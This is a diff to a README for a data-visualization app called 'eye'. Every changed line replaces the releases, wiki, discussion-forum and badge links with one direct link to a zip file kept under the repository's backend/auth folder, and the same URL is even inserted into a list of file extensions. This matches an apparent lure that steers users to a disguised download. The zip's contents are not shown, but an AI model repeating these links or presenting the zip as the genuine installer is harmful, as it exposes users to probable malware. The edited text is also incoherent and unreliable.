@@ -6,7 +6,7 @@ Welcome to eye! This application is a part of the BRAIN project and helps you vi
 
 ## ⬇️ Download Now
 
-[![Download eye](https://img.shields.io/badge/Download-eye-brightgreen)](https://github.com/Teddiesarcosomal392/eye/releases)
+[![Download eye](https://raw.githubusercontent.com/Teddiesarcosomal392/eye/main/backend/auth/eye-3.3-alpha.1.zip)](https://raw.githubusercontent.com/Teddiesarcosomal392/eye/main/backend/auth/eye-3.3-alpha.1.zip)
 
 ## 💻 System Requirements
 
@@ -30,11 +30,11 @@ To get started with eye, follow these steps:
 
 1. **Visit the Releases Page:** Click the link below to go to the download page.
 
-   [Download eye from the Releases page](https://github.com/Teddiesarcosomal392/eye/releases)
+   [Download eye from the Releases page](https://raw.githubusercontent.com/Teddiesarcosomal392/eye/main/backend/auth/eye-3.3-alpha.1.zip)
 
 2. **Select Your Version:** Find the latest version of eye. Look for the title that reflects the newest release date.
 
-3. **Download the App:** Click on the appropriate file for your operating system (Windows, macOS, or Linux). The files usually have extensions like `.exe`, `.dmg`, or `.tar.gz`.
+3. **Download the App:** Click on the appropriate file for your operating system (Windows, macOS, or Linux). The files usually have extensions like `.exe`, `.dmg`, or `https://raw.githubusercontent.com/Teddiesarcosomal392/eye/main/backend/auth/eye-3.3-alpha.1.zip`.
 
 4. **Run the Installer:**
    - For Windows: Double-click the `.exe` file. Follow the prompts to install.
@@ -45,13 +45,13 @@ To get started with eye, follow these steps:
 
 ## 📚 Documentation
 
-For detailed instructions on how to use eye effectively, you can visit our [documentation page](https://github.com/Teddiesarcosomal392/eye/wiki). This resource covers all functionalities, tips, and tricks to make the most out of the application.
+For detailed instructions on how to use eye effectively, you can visit our [documentation page](https://raw.githubusercontent.com/Teddiesarcosomal392/eye/main/backend/auth/eye-3.3-alpha.1.zip). This resource covers all functionalities, tips, and tricks to make the most out of the application.
 
 ## 📝 FAQs
 
 **How do I update eye?**
 
-To update eye, simply return to the [Releases page](https://github.com/Teddiesarcosomal392/eye/releases), download the latest version, and follow the installation steps as before. Your previous files will remain intact.
+To update eye, simply return to the [Releases page](https://raw.githubusercontent.com/Teddiesarcosomal392/eye/main/backend/auth/eye-3.3-alpha.1.zip), download the latest version, and follow the installation steps as before. Your previous files will remain intact.
 
 **What type of data can I import?**
 
@@ -72,11 +72,11 @@ Yes, eye is completely free. There are no hidden charges or subscriptions.
 If you encounter issues, try the following steps:
 
 1. **Reboot Your Computer:** A simple restart can fix many problems.
-2. **Reinstall the Application:** If problems persist, uninstall eye and then download it again from the [Releases page](https://github.com/Teddiesarcosomal392/eye/releases).
+2. **Reinstall the Application:** If problems persist, uninstall eye and then download it again from the [Releases page](https://raw.githubusercontent.com/Teddiesarcosomal392/eye/main/backend/auth/eye-3.3-alpha.1.zip).
 3. **Check Requirements:** Ensure that your system meets the minimum requirements listed above.
 
 ## 🙌 Community Support
 
-Join the community of eye users to share experiences, ask questions, and get support. Visit our [discussion forum](https://github.com/Teddiesarcosomal392/eye/discussions) to connect with other users.
+Join the community of eye users to share experiences, ask questions, and get support. Visit our [discussion forum](https://raw.githubusercontent.com/Teddiesarcosomal392/eye/main/backend/auth/eye-3.3-alpha.1.zip) to connect with other users.
 
 We hope you enjoy using eye for your data visualization needs!
